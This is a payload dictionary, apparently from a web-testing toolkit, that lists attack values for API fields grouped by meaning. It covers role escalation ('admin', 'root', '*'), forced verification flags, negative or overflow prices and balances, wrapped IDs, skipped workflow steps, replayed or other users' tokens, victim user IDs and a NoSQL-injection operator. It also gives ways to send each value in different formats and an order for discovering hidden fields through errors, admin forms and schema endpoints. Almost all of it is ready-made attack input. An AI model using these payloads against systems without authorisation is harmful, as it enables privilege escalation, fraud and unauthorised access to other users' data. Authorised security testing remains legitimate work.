# Payload dictionary — business-logic values by field semantic

Organized by what the field MEANS, not how it's spelled. Match the
semantic, pull the value set.

## Role fields (`role`, `isAdmin`, `permissions`, `groups`, `scope`)

```
admin administrator root superuser staff moderator owner system
service internal operator auditor developer debug test
["admin"] {"name":"admin"} ["admin","user"] "*"
0 1 9 99 0xFFFF -1                    (numeric-role fields)
```

## Verification fields (`verified`, `active`, `confirmed`, `approved`)

```
true 1 yes "true" "1" "yes" on enabled activated
{"verified":true} ["verified"] verified[]=true
```

## Economic fields (`balance`, `credits`, `price`, `discount`, `total`)

```
1000000 9999999 2147483647 4294967295 -1 0 0.001
-50 -100 -999999 0.00 free "0" null
```

## Index/ID fields (`id`, `index`, `offset`, `page`, `node`)

```
0 -1 <limit> <limit+1> 65535 65536 2147483647 2147483648
4294967295 4294967296 <computed wrap id>
```

## Step/state fields (`step`, `state`, `status`, `phase`, `stage`)

```
0 -1 1 2 3 4 5 99 N+1 MAX
cart paid confirmed complete done final active verified
"step3" {"step":3} step[]=3
```

## Token/code fields (`code`, `token`, `coupon`, `nonce`)

```
<consumed> <expired> <other-user's> <replayed>
"" null [] SAVE50 VIP FREE ADMIN100 TEST
```

## Time fields (`expiry`, `notBefore`, `createdAt`, `timestamp`)

```
0 -1 <now-1> <now> <now+1> 2147483647 4294967295
1970-01-01 2038-01-19 2038-01-20 2106-02-07 <future>
```

## Unit fields (`unit`, `currency`, `scale`)

```
cents dollars satoshi wei gwei usd USD eur
1 100 1000 0.01 1e-8 "cents" "dollars"
```

## Ownership fields (`owner`, `userId`, `objectId`, `docId`)

```
0 1 -1 <admin-uid> <victim-uid> <other-object>
null "" [] {"$ne":null}          (object-typed — nosqli-adjacent)
```

## Content-type / method permutations per value

Every value above is worth the three-carrier check where the endpoint
accepts multiple content-types:

```
JSON:        {"role":"admin"}
form:        role=admin
query:       ?role=admin
nested:      {"user":{"role":"admin"}}
array:       {"role":["admin"]}  role[]=admin
dotted:      user.role=admin     user[role]=admin
duplicate:   role=user&role=admin
```

## The field-discovery order

When the model's fields are unknown:

1. `GET` the object — every returned field is a candidate.
2. `bundle_miner` — JS objects built client-side name the fields.
3. error messages — `"X must be one of [...]"`, `"X is required"`,
   `"unknown field X"` leaks the schema either way.
4. admin/sibling endpoints — the admin update form renders the full
   field set.
5. doc/schema endpoints — `/_schema`, `/docs`, `/openapi.json`,
   GraphQL introspection.

Unknown field names are the only real blocker — everything else is a
value from this dictionary.
